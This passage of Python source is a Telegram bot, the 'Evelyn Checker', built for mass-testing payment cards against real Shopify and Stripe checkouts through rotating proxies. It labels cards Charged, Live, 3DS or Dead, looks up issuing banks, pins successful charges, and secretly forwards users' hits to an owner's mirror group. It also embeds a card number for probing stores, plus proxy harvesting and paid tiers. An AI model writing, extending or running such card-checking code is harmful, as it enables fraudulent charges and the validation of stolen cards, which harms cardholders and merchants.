        if attempt < max_retries - 1:
            msg_low = str(result.get('message', '')).lower()
            delay = 0.05 if ('request timeout' in msg_low or 'timed out' in msg_low) else retry_delay
            await asyncio.sleep(delay)

    # ========== FALLBACK API RETRY (error cards only) ==========
    if last_result and last_result.get('retry') and mgr.has_fallback():
        fb_api = mgr.pick_fallback_api_id()
        if fb_api:
            fb_site = _pick_chk_site(sites, used_sites, bad_sites)
            fb_proxy = random.choice(proxies)
            try:
                try:
                    fb_result = await asyncio.wait_for(
                        check_card(card, fb_site, fb_proxy, bypass_user_pool=bypass_user_pool, api_id=fb_api),
                        timeout=per_attempt_timeout,
                    )
                except asyncio.TimeoutError:
                    fb_result = {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
                if not fb_result.get('site'):
                    fb_result['site'] = fb_site
                # If fallback gave a clean result, use it
                if not fb_result.get('retry'):
                    if fb_result['status'] == 'Charged':
                        return fb_result
                    if is_live_hit_result(fb_result):
                        return _as_approved_result(fb_result)
                    return fb_result
                # Fallback also errored — use its result as last_result
                last_result = fb_result
                last_site = fb_site
            except Exception:
                pass  # Fallback failed, use original last_result

    # ========== FINAL RESULT ==========
    if last_result:
        if is_live_hit_result(last_result):
            return _as_approved_result(last_result)
        out = {
            'status': 'Dead',
            'message': f'Site errors: {last_result["message"]}',
            'card': card,
            'gateway': last_result.get('gateway', 'Unknown'),
            'price': last_result.get('price', '-'),
            'site': last_result.get('site') or last_site or 'Multiple',
        }
        return out

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': last_site or '-'}


def is_otp_result(result) -> bool:
    """3DS / OTP hits — count in Live stats; no mirror/GIF alert."""
    if not result:
        return False
    return _is_otp_hit_text(result.get('message', ''), result.get('status', ''))


def _build_hit_message(result, hit_type):
    emoji = "💎" if hit_type == "Charged" else "🔥"
    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"
    return emoji, status_text


def _build_hit_html(result, hit_type, brand, bin_type, level, bank, country, flag, extra='') -> str:
    card_safe = escape(str(result.get('card') or ''))
    
    status_lower = str(result.get("status", "") or "").strip().lower()
    msg_lower = str(result.get("message", "") or "").strip().lower()
    
    if hit_type == "Charged":
        status_title = "🤍 𝑪𝑯𝑨𝑹𝑮𝑬𝑫 🤍"
    elif "insufficient" in status_lower or "insufficient" in msg_lower or "insuff" in status_lower or "insuff" in msg_lower:
        status_title = "😀 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 😀"
    elif "3d" in status_lower or "3d" in msg_lower or "otp" in status_lower or "otp" in msg_lower or "challenge" in status_lower or "challenge" in msg_lower:
        status_title = "😀 𝟑𝑫𝑺 😀"
    else:
        status_title = "😀 𝑳𝑰𝑽𝑬 😀"
        
    status = escape(str(result.get('message') or hit_type).replace("💀", "").replace("☠️", "").replace("☠", "").strip()[:150])
    
    # Format gateway
    gateway = escape(str(result.get('gateway') or 'Unknown'))
    
    # Format price
    raw_price = str(result.get('price') or '-').strip()
    if raw_price.startswith("$"):
        price = escape(raw_price)
    elif raw_price in ("-", "", "N/A", "0.00", "0.0", "0"):
        price = "N/A"
    else:
        price = f"${escape(raw_price)}"
        
    # Format BIN Info
    parts = []
    for p in (brand, bin_type, level):
        p_str = str(p or '').strip()
        if p_str and p_str.upper() not in ("UNKNOWN", "-", "") and p_str not in parts:
            parts.append(p_str.upper())
    bin_line = escape(" - ".join(parts) if parts else "UNKNOWN")
    
    bank_name = str(bank or '').strip()
    if bank_name.lower() in ("unknown", "-", "", "none"):
        bank_name = "None"
    bank_escaped = escape(bank_name)
    
    country_name = str(country or '').strip()
    if country_name.lower() in ("unknown", "-", "", "none"):
        country_name = "Unknown"
    country_escaped = escape(country_name.upper())
    
    return (
        f"⚡️ 𝐄𝐕𝐄𝐋𝐘𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n"
        f"{status_title}\n\n"
        f"💳 CC : <code>{card_safe}</code>\n"
        f"🛒 Gateway : {gateway}\n"
        f"📝 Response: {status}\n"
        f"💵 Price   : {price}\n\n"
        f"💳 BIN Info: {bin_line}\n"
        f"🌐 Bank: {bank_escaped}\n"
        f"🌐 Country: {country_escaped} {flag}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📬 Made by <a href=\"{DEV_LINK}\">{DEV_NAME}</a>{extra}"
    )


async def mirror_hit_to_group(result, hit_type, username, origin_user_id, brand='-', bin_type='-', level='-', bank='-', country='-', flag=''):
    """Silent forward of live/charged hits to mirror group (/ap). Skips owners + OTP."""
    mirror_id = get_mirror_group()
    if not mirror_id:
        print('[mirror] no mirror group configured — run /ap in your group')
        return
    if is_owner(origin_user_id):
        return
    if is_otp_result(result):
        return
    extra = f"\n<blockquote>👤 From user: <code>{origin_user_id}</code> (@{escape(str(username or '-'))})</blockquote>"
    mirror_msg = _build_hit_html(result, hit_type, brand, bin_type, level, bank, country, flag, extra)
    try:
        sent = await safe_send(
            lambda: bot.send_message(
                int(mirror_id),
                premium_emoji(mirror_msg),
                parse_mode='html',
                link_preview=False,
                silent=True,
            ),
            user_id=int(mirror_id),
        )
        if sent:
            print(f"[mirror] forwarded {hit_type} hit to group {mirror_id} from {origin_user_id}")
        else:
            print(f"[mirror] send returned None for group {mirror_id}")
    except Exception as e:
        print(f"[mirror] send failed group={mirror_id}: {e}")


async def send_message_with_gif(chat_id, text, *, reply_to=None, parse_mode="html", buttons=None):
    text = premium_emoji(text)
    try:
        gif_url = await get_random_gif()
        kwargs = {"parse_mode": parse_mode, "link_preview": False}
        if buttons:
            kwargs["buttons"] = buttons
        if reply_to:
            kwargs["reply_to"] = reply_to
        return await bot.send_message(chat_id, text, file=gif_url, **kwargs)
    except Exception:
        return await bot.send_message(chat_id, text, parse_mode=parse_mode, link_preview=False, buttons=buttons)


async def send_realtime_hit(target_chat_id, result, hit_type, username, origin_user_id=None, skip_chat=False, user_entity=None, check_time="N/A"):
    """User gets Soul UI + GIF; mirror group always gets Evelyn HTML (OTP never alerts)."""
    if is_otp_result(result):
        return
    origin_user_id = origin_user_id if origin_user_id is not None else target_chat_id

    try:
        brand, bin_type, level, bank, country, flag = await asyncio.wait_for(
            get_bin_info(str(result.get('card', '')).split('|')[0]), timeout=2,
        )
    except (asyncio.TimeoutError, Exception):
        brand, bin_type, level, bank, country, flag = '-', '-', '-', '-', '-', ''

    if not skip_chat:
        display = evelyn_result_to_display(result, check_time, is_live_hit_result)
        if hit_type == "Charged":
            display["card_type"] = "charged"
        elif hit_type == "Approved":
            display["card_type"] = "live"

        class _U:
            def __init__(self, uid, ent):
                self.id = uid
                self.first_name = getattr(ent, "first_name", None) if ent else None
                self.username = getattr(ent, "username", None) if ent else username

        u = user_entity if user_entity is not None else _U(origin_user_id, None)
        try:
            message = await format_card_check_message(display, u)
            sent_msg = await safe_send(
                lambda: send_message_with_gif(target_chat_id, message),
                user_id=target_chat_id,
            )
            # Auto-pin charged card messages so user never loses them
            if hit_type == "Charged" and sent_msg is not None:
                try:
                    await asyncio.sleep(0.3)  # let Telegram finish processing media
                    await sent_msg.pin(notify=False)
                except Exception:
                    pass
        except Exception as e:
            print(f"[hit] user alert failed: {e}")

    await mirror_hit_to_group(
        result, hit_type, username, origin_user_id,
        brand, bin_type, level, bank, country, flag,
    )


async def update_progress(chat_id, message_id, results, current_attempt_count, force=False, range_label=None):
    lock = _progress_edit_locks.setdefault(message_id, asyncio.Lock())
    async with lock:
        results_copy = dict(results)
        results_copy['checked'] = current_attempt_count
        progress_text = build_chk_progress_text(results_copy, range_label=range_label)
        buttons = [
            [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
            [Button.inline("🛑 Stop", b"stop")],
        ]

        class _ProgressMsg:
            id = message_id

            @staticmethod
            def edit(text, **kwargs):
                return bot.edit_message(chat_id, message_id, text, **kwargs)

        await safe_edit(
            _ProgressMsg,
            premium_emoji(progress_text),
            force=force,
            user_id=chat_id,
            buttons=buttons,
            parse_mode='html',
        )

def safe_delete(filepath):
    """Safely delete a local temp file after sending"""
    try:
        if filepath and os.path.exists(filepath):
            os.remove(filepath)
    except Exception:
        pass


def mask_site(site, sites_list):
    """Mask site URL: show #N | https://*********.myshopify.com"""
    try:
        idx = sites_list.index(site) + 1
        site_num = f"#{idx}"
    except (ValueError, AttributeError):
        site_num = "#?"

    try:
        # Extract domain part after https:// or http://
        import re as _re
        match = _re.match(r'(https?://)([^/]+)(.*)', site)
        if match:
            protocol = match.group(1)
            domain = match.group(2)
            # Mask subdomain/store name, keep .myshopify.com or other TLD
            parts = domain.split('.')
            if len(parts) >= 2:
                masked_domain = '*********.' + '.'.join(parts[1:])
            else:
                masked_domain = '*********'
            masked_url = f"{protocol}{masked_domain}"
        else:
            masked_url = '*********'
    except Exception:
        masked_url = '*********'

    return f"{site_num} | {masked_url}"

async def send_final_results(target_chat_id, results, owner_user_id=None):
    """Send final results with txt file and new design"""
    owner_user_id = owner_user_id if owner_user_id is not None else target_chat_id
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    # Summary preview — OTP included in Live (no per-card alerts during check)
    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"💎 <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = (
        results['charged'][0]['gateway'] if results['charged'] else
        results['approved'][0]['gateway'] if results['approved'] else
        results['dead'][0]['gateway'] if results['dead'] else
        results.get('last_gateway', 'Shopify Payments')
    )

    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    summary = (
        f"⚡️ 𝐄𝐕𝐄𝐋𝐘𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n"
        f"⚡ 𝐑𝐞𝐬𝐮𝐥𝐭𝐬\n"
        f"💳 Total: {results['total']}\n"
        f"📊 Checked: {results.get('checked', len(results['charged']) + len(results['approved']) + len(results['dead']))}\n"
        f"🤍 Charged: {len(results['charged'])}\n"
        f"😀 Live: {len(results['approved'])}\n"
        f"⚠️ Dead: {len(results['dead'])}\n\n"
        f"🛒 Gateway: {gateway}\n\n"
        f"🎯 𝐇𝐢𝐭𝐬\n"
        f"{hits_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bot_by_html()}"
    )

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shopiii_{owner_user_id}_{timestamp}.txt"

    current_sites = results.get('chk_sites') or load_sites()

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("=" * 70 + "\n")
        await f.write("CC CHECKER RESULTS\n")
        await f.write("Format: CC | Gateway | Price | Message\n")
        await f.write("=" * 70 + "\n\n")

        await f.write(f"💎 CHARGED ({len(results['charged'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['charged']:
            msg = str(r.get('message') or r.get('response') or '')[:100]
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {msg}\n")
        await f.write("\n")

        await f.write(f"🔥 LIVE ({len(results['approved'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['approved']:
            msg = str(r.get('message') or r.get('response') or '')[:100]
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {msg}\n")
        await f.write("\n")

        await f.write(f"❌ DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['dead']:
            msg = str(r.get('message') or r.get('response') or '')[:100]
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {msg}\n")

    try:
        await safe_send(
            lambda: bot.send_file(target_chat_id, file=filename, caption=premium_emoji(summary), parse_mode='html'),
            user_id=target_chat_id,
        )
    finally:
        safe_delete(filename)



async def test_site(site, proxy):
    """Test a single site — must pass Shopify gateway, price range, and live decline keywords."""
    test_cards = [
        "5253620788881124|12|2033|824",   # Mastercard only
    ]

    def _check_response(raw):
        if not isinstance(raw, dict):
            return False, 'Bad API response (not JSON object)', str(raw)[:200], 999.0, {}

        response_msg = str(
            raw.get('Response') or raw.get('response') or
            raw.get('Message') or raw.get('message') or ''
        ).strip()
        status_raw = raw.get('Status', '')
        status_str = '' if isinstance(status_raw, bool) else str(status_raw or '')

        if is_dead_site_error(response_msg) or _is_site_error_response(response_msg, status_str):
            return False, f"Dead site response ({response_msg})", response_msg, 999.0, raw

        price_raw = raw.get('Price', '') or ''
        gate = str(raw.get('Gateway') or raw.get('Gate') or '').strip()
        gate_lower = gate.lower()
        response_lower = response_msg.lower()

        try:
            price_str = str(price_raw).replace('$', '').replace(',', '').strip()
            price_val = float(price_str) if price_str else 999.0
        except Exception:
            price_val = 999.0

        cond_price = GLOBAL_MIN_PRICE <= price_val <= GLOBAL_MAX_PRICE
        cond_gateway = bool(gate) and gate_lower not in ('unknown', '-', 'n/a', 'none') and 'shopify' in gate_lower
        cond_response = (
            'card_declined' in response_lower or
            'card declined' in response_lower or
            'insufficient_funds' in response_lower or
            'insufficient funds' in response_lower or
            'do_not_honor' in response_lower or
            'incorrect_cvc' in response_lower or
            'incorrect_zip' in response_lower or
            'invalid_cvc' in response_lower
        )
        dead_reason = None

        if not cond_price:
            dead_reason = f"Price out of range (${price_val}, need ${GLOBAL_MIN_PRICE:.2f}-${GLOBAL_MAX_PRICE:.0f})"
        elif not cond_gateway:
            dead_reason = f"Wrong gateway ({gate or 'Unknown'})"
        elif not cond_response:
            dead_reason = f"Bad response ({response_msg or 'empty'})"

        return cond_price and cond_gateway and cond_response, dead_reason, response_msg, price_val, raw

    try:
        last_raw = {}
        last_dead_reason = None
        last_response_msg = ''
        last_price_val = 999.0
        passed_count = 0

        mgr = get_checker_manager()
        api_id = _pick_site_check_api_id(mgr) or mgr.pick_api_id()
        if not api_id:
            return {
                'site': site, 'status': 'dead',
                'gateway': 'Unknown', 'price': '-',
                'response': 'No checker API enabled',
                'reason': 'No checker API enabled',
            }

        for test_card in test_cards:
            try:
                async with _get_site_check_api_sem(api_id):
                    raw = await _checker_request(mgr.get_api_url(api_id), site, test_card, proxy)
            except Exception as exc:
                last_dead_reason = str(exc)
                continue

            passed, dead_reason, response_msg, price_val, last_raw = _check_response(raw)
            last_dead_reason = dead_reason
            last_response_msg = response_msg
            last_price_val = price_val

            if passed:
                passed_count += 1
                break

            # One retry on API infra errors (invalid json / timeout) — not on bad sites
            infra_retry = dead_reason and any(
                k in (response_msg or '').lower()
                for k in ('invalid json', 'timeout', 'empty api', 'bad api')
            )
            if infra_retry:
                retry_api = mgr.pick_api_id(exclude=api_id)
                if retry_api:
                    try:
                        async with _get_site_check_api_sem(retry_api):
                            raw2 = await _checker_request(mgr.get_api_url(retry_api), site, test_card, proxy)
                        passed2, dr2, rm2, pv2, lr2 = _check_response(raw2)
                        if passed2:
                            passed_count += 1
                            last_raw = lr2
                            last_response_msg = rm2
                            last_price_val = pv2
                            break
                        last_dead_reason = dr2
                        last_response_msg = rm2
                        last_price_val = pv2
                        last_raw = lr2
                    except Exception:
                        pass

        gateway_display = last_raw.get('Gateway', last_raw.get('Gate', 'Unknown')) if last_raw else 'Unknown'
        price_display = f"${last_price_val}" if last_price_val != 999.0 else '-'

        # Alive agar kam se kam 1 card pass kare
        if passed_count >= 1:
            return {
                'site': site, 'status': 'alive',
                'gateway': gateway_display,
                'price': price_display,
                'response': last_response_msg
            }
        else:
            return {
                'site': site, 'status': 'dead',
                'gateway': gateway_display,
                'price': price_display,
                'response': last_response_msg,
                'reason': last_dead_reason or 'All cards failed'
            }

    except Exception as e:
        return {
            'site': site, 'status': 'dead',
            'gateway': 'Unknown', 'price': '-',
            'response': str(e),
            'reason': f"Exception: {str(e)}"
        }

def _extract_proxy(line: str):
    """Smart proxy extractor — pulls a proxy from messy input and normalizes to ip:port or ip:port:user:pass.
    Handles: numbered lists, URL formats, scheme prefixes, user@host, trailing junk.
    Returns the cleaned proxy string or None if nothing valid found."""
    if not line or not isinstance(line, str):
        return None
    line = line.strip()
    if not line:
        return None

    # Strip leading numbering like "1. " or "1) " or "1: " or "- " or "* "
    # Require space after dot/colon so it doesn't strip IPv4 octets or port/auth fields
    stripped = re.sub(r'^\d+(?:\s*[)\-]\s*|\.\s+|\s*:\s+)', '', line).strip()
    stripped = re.sub(r'^[-*•→▸]\s*', '', stripped).strip()
    if not stripped:
        return None

    # Handle URL format: http://user:pass@ip:port or socks5://user:pass@ip:port
    url_match = re.match(
        r'(?:https?|socks[45]?)://(?:([^:@]+):([^@]+)@)?([^/:]+):(\d+)',
        stripped, re.IGNORECASE,
    )
    if url_match:
        user, pwd, host, port = url_match.groups()
        if user and pwd:
            return f"{host}:{port}:{user}:{pwd}"
        return f"{host}:{port}"

    # Handle user:pass@ip:port format (no scheme)
    at_match = re.match(
        r'([^:@\s]+):([^@\s]+)@([^/:@\s]+):(\d+)',
        stripped,
    )
    if at_match:
        user, pwd, host, port = at_match.groups()
        return f"{host}:{port}:{user}:{pwd}"

    # Handle ip:port@user:pass format
    at_match2 = re.match(
        r'([^/:@\s]+):(\d+)@([^:@\s]+):([^\s]+)',
        stripped,
    )
    if at_match2:
        host, port, user, pwd = at_match2.groups()
        return f"{host}:{port}:{user}:{pwd}"

    # Strip scheme prefix if present (without URL-style auth)
    for scheme in ('http://', 'https://', 'socks5://', 'socks4://', 'socks://'):
        if stripped.lower().startswith(scheme):
            stripped = stripped[len(scheme):]
            break

    # Try to extract ip:port:user:pass or ip:port from the remaining text
    # Match the proxy at the start, ignore trailing junk
    proxy_match = re.match(
        r'([a-zA-Z0-9][\w.-]*\.[a-zA-Z0-9-]+):(\d{1,5})(?::([^:\s]+):([^:\s]+))?',
        stripped,
    )
    if proxy_match:
        host, port, user, pwd = proxy_match.groups()
        try:
            p = int(port)
            if p < 1 or p > 65535:
                return None
        except ValueError:
            return None
        if user and pwd:
            return f"{host}:{port}:{user}:{pwd}"
        return f"{host}:{port}"

    return None


def _extract_proxies_from_lines(lines):
    """Extract and normalize proxies from a list of raw input lines.
    Returns (extracted_proxies, skipped_count)."""
    extracted = []
    skipped = 0
    for line in lines:
        proxy = _extract_proxy(line)
        if proxy and _is_valid_proxy_format(proxy):
            extracted.append(proxy)
        else:
            skipped += 1
    return extracted, skipped


def _is_valid_proxy_format(proxy: str) -> bool:
    """Validate proxy is host:port or host:port:user:pass with a real numeric port."""
    if not proxy or not isinstance(proxy, str):
        return False
    proxy = proxy.strip()
    # Strip scheme if user pasted http://host:port
    for scheme in ('http://', 'https://', 'socks5://', 'socks4://', 'socks://'):
        if proxy.lower().startswith(scheme):
            proxy = proxy[len(scheme):]
            break
    parts = proxy.split(':')
    if len(parts) not in (2, 4):
        return False
    host, port = parts[0], parts[1]
    if not host or any(c.isspace() for c in host):
        return False
    # Host must contain a dot (IP or domain) — rejects bare words like "first"
    if '.' not in host:
        return False
    # Each host label must be non-empty and use only valid chars
    for label in host.split('.'):
        if not label:
            return False
        for c in label:
            if not (c.isalnum() or c == '-'):
                return False
    # Port must be numeric 1-65535
    if not port.isdigit():
        return False
    p = int(port)
    if p < 1 or p > 65535:
        return False
    # If user:pass present, both must be non-empty
    if len(parts) == 4:
        if not parts[2] or not parts[3]:
            return False
    return True

_proxy_check_session = None
_proxy_check_sem = asyncio.Semaphore(5)

def get_proxy_check_session():
    global _proxy_check_session
    if _proxy_check_session is None or _proxy_check_session.closed:
        timeout = aiohttp.ClientTimeout(total=60)
        connector = aiohttp.TCPConnector(limit=500)
        _proxy_check_session = aiohttp.ClientSession(timeout=timeout, connector=connector)
    return _proxy_check_session

async def test_proxy(proxy):
    """Test a single proxy via Hunter proxy checker API."""
    proxy = (proxy or "").strip()
    if not _is_valid_proxy_format(proxy):
        return {'proxy': proxy, 'status': 'dead'}
    async with _proxy_check_sem:
        try:
            url = f"{PROXY_CHECK_API_URL}?data={quote(proxy, safe='')}"
            session = get_proxy_check_session()
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                if resp.status != 200:
                    print(f"[test_proxy] API returned status code {resp.status} for {proxy}")
                    return {'proxy': proxy, 'status': 'dead'}
                raw = await resp.json(content_type=None)
            if not isinstance(raw, dict):
                print(f"[test_proxy] API returned non-JSON/non-dict response for {proxy}: {raw}")
                return {'proxy': proxy, 'status': 'dead'}
            if (raw.get('status') or '').lower() != 'live':
                print(f"[test_proxy] Proxy {proxy} marked dead by API. Response: {raw}")
                return {'proxy': proxy, 'status': 'dead'}
            host, port, user, pwd = raw.get('host'), raw.get('port'), raw.get('user'), raw.get('pass')
            if host and port and user and pwd:
                proxy = f"{host}:{port}:{user}:{pwd}"
            return {'proxy': proxy, 'status': 'alive'}
        except Exception as e:
            print(f"[test_proxy] Exception checking {proxy}: {e.__class__.__name__}: {e}")
            return {'proxy': proxy, 'status': 'dead'}
@bot.on(events.NewMessage(pattern=r'^/start(\s|$)'))
async def start(event):
    user_id = event.sender_id
    try:
        tier_name, card_limit = get_user_tier_display(user_id)
        if is_premium(user_id) or is_owner(user_id):
            tier_line = (
                f"🤩 <b>Tier</b> : {tier_name}\n"
                f"📊 <b>Limit</b> : {card_limit:,} cards per /chk\n"
            )
        else:
            tier_line = (
                "🆓 <b>Tier</b> : Free\n"
                f"📊 <b>Limit</b> : {FREE_CARD_LIMIT:,} cards per /chk\n"
                "💎 <b>Redeem</b> : <u>/redeem</u> &lt;key&gt;\n"
            )

        menu_text = (
            f"⚡ 𝐄𝐕𝐄𝐋𝐘𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡\n\n"
            f"🤍 𝑾𝑬𝑳𝑪𝑶𝑴𝑬 🤍\n\n"
            f"{tier_line}\n"
            f"🔥 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺 🔥\n\n"
            f"💳 <u>/sh</u> cc — Single Check (Shopify)\n"
            f"💳 <u>/st</u> cc — Single Check (Stripe $1)\n"
            f"💳 <u>/bin</u> bin — BIN Lookup\n"
            f"📝 <u>/chk</u> — Mass Check (Reply to .txt)\n\n"
            f"📲 𝑷𝑹𝑶𝑿𝑰𝑬𝑺 📲\n\n"
            f"✔️ <u>/addproxy</u> — Add proxies (text/file)\n"
            f"✔️ <u>/proxy</u> — Check & clean proxies\n"
            f"✔️ <u>/clearproxy</u> — Clear all proxies\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📬 Made by <a href=\"{DEV_LINK}\">{DEV_NAME}</a>"
        )

        await event.reply(
            premium_emoji(menu_text),
            parse_mode='html'
        )
    except FloodWaitError as e:
        print(f"[FloodWait] /start: waiting {e.seconds}s")
        await asyncio.sleep(e.seconds + 1)
    except Exception as e:
        print(f"[start] Error: {e}")

@bot.on(events.NewMessage(pattern=r'^/sh(\s|$)'))
async def single_cc_check(event):
    """Check a single CC"""
    user_id = event.sender_id
    target_chat_id = event.chat_id or user_id

    sender = None
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"

    sh_sites = site_urls_from_entries(get_sh_global_sites())
    proxies = get_check_proxies(user_id)

    if not sh_sites:
        await event.reply(
            premium_emoji(
                f"❌ No global sites under <b>${SH_MAX_PRICE:.0f}</b>. "
                f"Owner: add sites with /addsite (price ≤ ${SH_MAX_PRICE:.0f})."
            ),
            parse_mode='html',
        )
        return
    if not get_checker_manager().total_workers():
        await event.reply(premium_emoji("❌ No checker API enabled. Owner: <code>/apiconfig</code>"), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ <b>No valid proxies found in your account.</b>\n\nAdd your own with <code>/addproxy</code> first."), parse_mode='html')
        return

    cc_input = event.message.text.split(' ', 1)
    text_source = ""
    if len(cc_input) >= 2 and cc_input[1].strip():
        text_source = cc_input[1].strip()
    elif event.is_reply:
        replied = await event.get_reply_message()
        if replied and replied.message:
            text_source = replied.message

    if not text_source:
        await event.reply(premium_emoji("❌ Usage: <code>/sh card|mm|yy|cvv</code>\nOr reply to a message containing a CC with <code>/sh</code>"), parse_mode='html')
        return
    cards = extract_cc(text_source)

    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/sh card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]

    status_msg = await event.reply(
        premium_emoji(
            f"⚡️ 𝐄𝐕𝐄𝐋𝐘𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n"
            f"💳 CC : <code>{escape(card)}</code>\n"
            f"Checking… (global sites ≤ ${SH_MAX_PRICE:.0f})"
        ),
        parse_mode='html',
    )

    try:
        start_time = time.time()
        try:
            result = await asyncio.wait_for(
                check_card_with_retry(
                    card, sh_sites, proxies, max_retries=6, bypass_user_pool=False,
                    per_attempt_timeout=20,
                ),
                timeout=130,
            )
        except asyncio.TimeoutError:
            result = {'status': 'Dead', 'response': 'Timeout — check took too long', 'card': card}
        elapsed = f"{time.time() - start_time:.2f}s"
        display = evelyn_result_to_display(result, elapsed, is_live_hit_result)
        if result.get('status') == 'Charged':
            display['card_type'] = 'charged'
        elif is_live_hit_result(result):
            display['card_type'] = 'live'
        if sender is None:
            class _ShUser:
                id = user_id
                first_name = username
                username = username
            sender = _ShUser()
        final_resp = await format_card_check_message(display, sender)

        # OTP: show result inline only — no GIF / realtime hit ping
        is_alert_hit = (
            result.get('status') == 'Charged'
            or (is_live_hit_result(result) and not is_otp_result(result))
        )
        if is_alert_hit:
            try:
                await status_msg.delete()
            except Exception:
                pass
            hit_msg = await send_message_with_gif(target_chat_id, final_resp)
            # Auto-pin charged card messages
            if result.get('status') == 'Charged' and hit_msg is not None:
                try:
                    await asyncio.sleep(0.3)  # let Telegram finish processing media
                    await hit_msg.pin(notify=False)
                except Exception:
                    pass
        else:
            await safe_edit(status_msg, premium_emoji(final_resp), force=True, user_id=target_chat_id, parse_mode='html', link_preview=False)

        try:
            hit_type = None
            if result.get('status') == 'Charged':
                hit_type = 'Charged'
                _log_charge_sync(result.get('card', ''), result.get('gateway', 'Unknown'), result.get('price', '-'), result.get('message', ''))
            elif is_live_hit_result(result):
                result = _as_approved_result(result)
                hit_type = 'Approved'
            if hit_type and not is_otp_result(result):
                await send_realtime_hit(
                    target_chat_id, result, hit_type, username,
                    origin_user_id=user_id, skip_chat=True,
                )
        except Exception:
            pass

    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Error checking card: {e}"), force=True, user_id=target_chat_id, parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^\.testc(\s|$)'))
async def testc_handler(event):
    """Hidden owner-only — fake charged hit + GIF to test hit UI."""
    if not is_owner(event.sender_id):
        return
    if not event.is_reply:
        return await event.reply(
            premium_emoji("❌ Reply to a card message with <code>.testc</code>"),
            parse_mode='html',
        )
    replied = await event.get_reply_message()
    text_source = (replied.message or replied.text or "").strip()
    cards = extract_cc(text_source)
    if not cards:
        return await event.reply(
            premium_emoji("❌ No valid card in replied message. Use: <code>number|mm|yy|cvv</code>"),
            parse_mode='html',
        )
    card = cards[0]
    user = await event.get_sender()
    username = user.username if getattr(user, 'username', None) else f"user_{event.sender_id}"
    fake_result = {
        'card': card,
        'status': 'Charged',
        'message': 'Thank you for your payment of $4.99 for Order ID: #TEST123456',
        'gateway': 'Shopify Payments',
        'price': '$4.99',
    }
    await send_realtime_hit(
        event.chat_id,
        fake_result,
        'Charged',
        username,
        origin_user_id=event.sender_id,
        user_entity=user,
        check_time='1.23s',
    )


@bot.on(events.NewMessage(pattern=r'^\.test(\s|$)'))
async def test_ui_command(event):
    """Fake Charged + Live hit UI testing cmd. Usage: .test (as reply to card, or followed by card details)"""
    if not is_owner(event.sender_id):
        return
        
    card = ""
    if event.is_reply:
        replied = await event.get_reply_message()
        text_source = (replied.message or replied.text or "").strip()
        cards = extract_cc(text_source)
        if cards:
            card = cards[0]
            
    if not card:
        # Try parsing from message arguments
        parts = (event.message.text or '').split(maxsplit=1)
        if len(parts) > 1:
            cards = extract_cc(parts[1])
            if cards:
                card = cards[0]
                
    if not card:
        return await event.reply(
            premium_emoji("❌ Reply to a card message with <code>.test</code>, or use <code>.test card_details</code>"),
            parse_mode='html',
        )
        
    user = await event.get_sender()
    username = user.username if getattr(user, 'username', None) else f"user_{event.sender_id}"
    
    # Send Charged UI check
    fake_charged = {
        'card': card,
        'status': 'Charged',
        'message': 'Thank you for your payment of $15.78 for Order ID: #TEST123456',
        'gateway': 'Shopify Payments',
        'price': '$15.78',
    }
    await send_realtime_hit(
        event.chat_id,
        fake_charged,
        'Charged',
        username,
        origin_user_id=event.sender_id,
        user_entity=user,
        check_time='1.23s',
    )
    
    # Send Insufficient Funds UI check
    fake_insuff = {
        'card': card,
        'status': 'insufficient_funds',
        'message': 'Insufficient Funds',
        'gateway': 'Shopify Payments',
        'price': '$10.50',
    }
    await send_realtime_hit(
        event.chat_id,
        fake_insuff,
        'Approved',
        username,
        origin_user_id=event.sender_id,
        user_entity=user,
        check_time='1.23s',
    )
    
    # Send 3DS UI check
    fake_3ds = {
        'card': card,
        'status': '3ds_challenge',
        'message': 'OTP Verification Required',
        'gateway': 'Shopify Payments',
        'price': '$1.00',
    }
    await send_realtime_hit(
        event.chat_id,
        fake_3ds,
        'Approved',
        username,
        origin_user_id=event.sender_id,
        user_entity=user,
        check_time='1.23s',
    )
    
    # Send Live UI check
    fake_live = {
        'card': card,
        'status': 'Approved',
        'message': 'Approved',
        'gateway': 'Shopify Payments',
        'price': '0.00',
    }
    await send_realtime_hit(
